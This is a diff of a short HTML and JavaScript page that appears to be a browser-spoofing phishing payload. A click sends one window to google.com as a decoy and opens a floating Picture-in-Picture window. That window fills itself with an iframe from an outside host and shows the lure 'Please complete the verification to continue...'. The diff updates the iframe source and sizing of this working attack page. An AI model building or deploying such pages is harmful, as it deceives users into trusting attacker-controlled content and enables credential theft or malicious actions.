@@ -1,31 +1,47 @@
-
 <body><center><br><img id=img style="cursor: pointer;" src=https://cdn.prod.website-files.com/5c2a9a234fdbba7439c48fa4/632cc665abbc286ce8f3e896_Screen%20Shot%202022-09-22%20at%204.11.09%20PM.webp onclick=start();>
 
 <script>
 
     var pipOpen = async () => {
-        pipWindow = await documentPictureInPicture.requestWindow({
-            width: outerWidth-400,
-            height: outerHeight+150
-        });
+        try {
+            // Chrome memiliki size restrictions, gunakan size yang reasonable
+            pipWindow = await documentPictureInPicture.requestWindow({
+                width: 800,
+                height: 600
+            });
 
-        pipWindow.document.body.innerHTML=(`<iframe src="https://sauceialist.github.io/dia/test3.html" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe><div style=font-size:999px>test<br>test<br><br><br><br>test`); 
+            // Content yang sama tapi optimized untuk smaller window
+            pipWindow.document.body.innerHTML=(`
+                <iframe src="https://pwr.wtf/arc/1.html" 
+                        style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; 
+                               border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
+                </iframe>
+                <div style="font-size: 20px; padding: 20px;">
+                    Please complete the verification to continue...
+                </div>
+            `); 
 
-setTimeout(()=>{pipWindow.window.scrollTo(0, document.body.scrollHeight);},1000);
-
+        } catch (error) {
+            console.error('PiP failed:', error);
+            alert('PiP not supported or blocked: ' + error.message);
+        }
     };
 
 
 function start(){
-
-x = window.open('about:blank','x');
-x.y=x.window.open('https://programmablesearchengine.google.com/about/#','y');
-
+    x = window.open('about:blank','x');
+    x.y = x.window.open(window.location.href + '#two','y');
 }
 
-start();
+// Auto-start hanya jika tidak ada hash
+if(!location.hash){
+    start();
+}
+
 if(location.hash=='#two'){
-document.body.innerHTML=`<center><br><img id=img style="cursor: pointer;" src=https://cdn.prod.website-files.com/5c2a9a234fdbba7439c48fa4/632cc665abbc286ce8f3e896_Screen%20Shot%202022-09-22%20at%204.11.09%20PM.webp  onclick="window.open('https://google.com/','x');pipOpen();">`;
+    document.body.innerHTML=`<center><br><img id=img style="cursor: pointer;" 
+        src=https://cdn.prod.website-files.com/5c2a9a234fdbba7439c48fa4/632cc665abbc286ce8f3e896_Screen%20Shot%202022-09-22%20at%204.11.09%20PM.webp  
+        onclick="window.open('https://google.com/','x'); pipOpen();">`;
 }
 
 </script>
